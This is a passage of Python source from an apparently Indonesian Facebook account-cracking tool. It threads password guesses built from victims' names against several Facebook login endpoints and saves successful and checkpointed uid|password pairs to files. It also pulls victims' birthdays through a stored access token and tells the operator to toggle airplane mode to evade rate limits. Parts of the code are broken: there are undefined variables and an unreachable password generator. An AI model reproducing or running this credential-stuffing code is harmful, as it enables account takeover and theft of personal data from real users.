            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print(f"{B} | ")
        jalan(f"\r{M}[!] Akun terkena spam")
    if "c_user" in ses.cookies:
        jalan(f"\r{P}[•]{I} Akun berhasil di login")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in tempek.find_all("option")]
        for opt in range(len(ngew)):
            jalan(f"\r{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        jalan(f"\r{P}[!]{M}>>>> {oh}")
    else:
        jalan(f"\r{P}[•]{M} Akun tersebut sandi nya telah di ganti")
        
def cek_hasil():
    print('%s║'%(B))
    print('%s║'%(B))
    print(f"{P}[•] Masukan file cp ")
    print(f"{P}[•] Contoh untuk masukan file : {B}CP/{tanggal}.json")
    print('%s║'%(B))
    files =input(f"{P}[•] Masukan nama file : {B}")
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print('%s║'%(B))
        print('%s║'%(B))
        print(f"{P}[!]{M} File tidak di temukan");exit()
        time.sleep(2); cek_hasil()
    print('%s║'%(B))
    print(f"{P}[•] Total akun chekpoint : {B}{str(len(buka_baju))}")
    print('%s║'%(B))
    print('%s║'%(B))
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("|")
        print(f"{B} | ")
        print(f"{P}[•] Akun facebook : {B}{kontol}")
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print('%s║'%(B))
    print('%s║'%(B))
    input(f"{P}[•]{I} Chek akun sudah selesai")
    menu()
    
def cek_results():
    try:
        open("OK/%s.json"%(tanggal))
    except IOError:
        os.system("touch OK/%s.json"%(tanggal))
    try:
        open("CP/%s.json"%(tanggal))
    except IOError:
        os.system("touch CP/%s.json"%(tanggal))
    cp=("CP/%s.json"%(tanggal))
    ok=("OK/%s.json"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    print('%s║'%(B))
    print('%s║'%(B))
    print(f"{K}╠══[01] {P}Cek results cp")
    print(f"{K}╠══[02] {P}Cek results ok")
    print(f"{K}╠══[0] {P}Back")
    print(f"{B} | ")
    _pil3h=input(f"{K}╠══[•] {P}Pilih : {B}")
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            print(f"{B} | ")
            print(f"{K}╠══[•]{M} Results cp{B}")
            os.system("cat CP/%s.json"%(tanggal))
        else:print(f"{K}╠══[•] Tidak ada hasil")
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            print('%s║'%(B))
            print('%s║'%(B))
            print(f"{K}╠══[•]{I} Results ok")
            os.system("cat OK/%s.json"%(tanggal))
        else:print(f"\n{P}[•]{M} Tidak ada hasil")
    elif _pil3h in ["0","00"]:
        menu()
    else:print(f"{P}[•]{M} Pilian tidak ada")

 ### pawrodd
def password(user):
    global fii_xd
    fii = []
    for i in range(0,10000000000000):fii.append(str(i))
    return fii
    try:
            ps, pp, na = fii_xd, fii_xd, user.split(" ")
            if len(na) < 2:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:fii.append(nd+"123");fii.append(nd+"12345")
                else:fii.append(nd);fii.append(nd+"123");fii.append(nd+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for i in pp.split(','):fii.append(nd+i)
            else:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:fii.append(nd+"123");fii.append(nd+"12345")
                else:fii.append(nd);fii.append(nd+"123");fii.append(nd+"12345")
                nb = na[-1].lower()
                if len(nb)<3:pass
                elif len(nb)==3 or len(nb)==4 or len(nb)==5:fii.append(nb+"123");fii.append(nb+"12345")
                else:fii.append(nb);fii.append(nb+"123");fii.append(nb+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for i in pp.split(','):fii.append(nd+i);fii.append(nb+i)
            if ps in ['',' ','  ']:
                pass
            else:
                for z in ps.split(','):fii.append(z)
            fii.append(user.lower())
            return fii
    except:return fii


def fii_xd():
	print('%s║'%(B))
	kone()
	print('%s║'%(B))
	fiisayangwidiya =input(f"{K}╠══[•] {P}Pilih : {B}")
	if fiisayangwidiya in [""]:
		print('%s║'%(B))
		print(f"{K}╠══[•]{M} Pilihan tidak boleh kosong");exit()
	elif fiisayangwidiya in ["1","01"]:
		print(f"{K}╠══[•] {P}Tampilan kan opsi akun chek point {B}Y/t")
		jalan(f"{K}╠══[!]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print('%s║'%(B))
		_checkoptions_=input(f"{K}╠══[•] {P}Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "anjink"
				key = "anjink" #----- jangan di ubah
				if _key in key:
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Crack menggunakan password manual/default {B}M/D")
					print('%s║'%(B))
					ter =input(f"{K}╠══[•] {P}Input : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print('%s║'%(B))
							print('%s║'%(B))
							print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
							print('%s║'%(B))
							asu = print(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
							if len(asu) =="":
								print('%s║'%(B))
								print(f"{K}╠══[•]{M} Sandi tidak boleh kosong");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(api, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(api, uid, fii)
						exit()
				else:print(f"{K}╠══[•]{M} Eror");exit()
			except (KeyError,IOError):print(f"{P}[•]{M} Eror");exit()

		else:
			print('%s║'%(B))
			print(f"{K}╠══[•] {P}Crack menggunakan password manual/default {B}M/D")
			print('%s║'%(B))
			ter =input(f"{K}╠══[•] {P}Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
					print('%s║'%(B))
					asu = input(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
					if len(asu) =="":
						print('%s║'%(B))
						print('%s║'%(B))
						print(f"{K}╠══[!]{M} Sandi tidak boleh kosong")
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(api, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]

						coeg.submit(apiiii, uid, fii)
				exit()

	elif fiisayangwidiya in ["3","03"]:
		print('%s║'%(B))
		print('%s║'%(B))
		print(f"{K}╠══[•] {P}Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{K}╠══[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print('%s║'%(B))
		_checkoptions_=input(f"{K}╠══[•] {P}Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Crack menggunakan password manual/default {B}M/D")
					print('%s║'%(B))
					ter =input(f"{K}╠══[•] {P}Pilih : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print('%s║'%(B))
							print('%s║'%(B))
							print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
							print('%s║'%(B))
							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print('%s║'%(B))
								print(f"{K}╠══[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mobil, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mobill, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print('%s║'%(B))
			print('%s║'%(B))
			print(f"{K}╠══[•] {P}Crack menggunakan pasword manual/defaults {B}M/D")
			print('%s║'%(B))
			ter =input(f"{K}╠══[•] {P}Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Contoh password {B}Anjink,kontol,sayang")
					print('%s║'%(B))
					asu = input(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
					if len(asu) =="":
						print('%s║'%(B))
						print('%s║'%(B))
						print(f"{K}╠══[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mobil, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "sayang", "sayangkamu" ]
						coeg.submit(mobill, uid, fii)
				exit()
				
	elif fiisayangwidiya in ["2","02"]:
		print('%s║'%(B))
		print('%s║'%(B))
		print(f"{K}╠══[•] {P}Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{K}╠══[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print('%s║'%(B))
		_checkoptions_=input(f"{K}╠══[•] {P}Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] Crack {P}menggunakan password manual/default {B}M/D")
					print('%s║'%(B))
					ter =input(f"{K}╠══[•] {P}Pilih : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print('%s║'%(B))
							print('%s║'%(B))
							print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
							print('%s║'%(B))
							asu = input(f"{K}╠══[•] {P}Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print('%s║'%(B))
								print(f"{K}╠══[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mbasic, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print('%s║'%(B))
			print('%s║'%(B))
			print(f"{K}╠══[•] {P}Crack menggunakan pasword manual/defaults {B}M/D")
			print('%s║'%(B))
			ter =input(f"{K}╠══[•] {P}Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Contoh password {B}Anjink,kontol,sayang")
					print('%s║'%(B))
					asu = input(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
					if len(asu) =="":
						print('%s║'%(B))
						print('%s║'%(B))
						print(f"{K}╠══[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bismillah", "anjing", "sayang", "sayangkamu" ]
						coeg.submit(mbasicc, uid, fii)
				exit()
				
def kone():
    print('%s║'%(B))
    print('%s║'%(B))
    print('%s╠══[%s1%s] %sB-Api %s<><><>%s Kencang'%(K,P,K,P,K,P))
    print('%s╠══[%s2%s] %smbasic %s<><><>%s Lambat'%(K,P,K,P,K,P))
    print('%s╠══[%s3%s] %sMobile %s<><><>%s SuperLambat'%(K,P,K,P,K,P))

def started():
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(K,P,K,P))
    print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.json'%(K,P,K,P,tanggal))
    print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.json'%(K,P,K,P,tanggal))
    print('%s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(K,P,K,P))
    print('%s║%s'%(B,P))

def api(uid, fii):
    try:
        ua = open('ugent.json','r').read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie
    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            cek_log(uid,pw,ua)
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def apiiii(uid, fii):
    try:
        ua = open('ugent.json','r').read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def mbasic(uid, fii):
	try:
		ua = open('ugent.json','r').read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicc(uid, fii):
	try:
		ua = open('ugent.json','r').read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
			fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mobil(uid, fii):
	try:
		ua = open('ugent.json','r').read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mobile.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ss.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobill(uid, fii):
	try:
		ua = open('ugent.json','r').read()
	except IOError:
